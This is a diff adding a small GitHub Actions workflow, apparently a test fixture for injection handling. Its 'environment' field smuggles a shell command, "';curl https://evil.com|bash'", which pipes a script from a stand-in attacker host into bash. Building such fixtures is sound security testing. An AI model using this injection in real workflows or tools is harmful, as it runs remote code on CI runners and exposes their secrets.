@@ -1,0 +1,9 @@
+name: Trigger
+on:
+  pull_request:
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    environment: "';curl https://evil.com|bash'"
+    steps:
+      - run: echo "test"
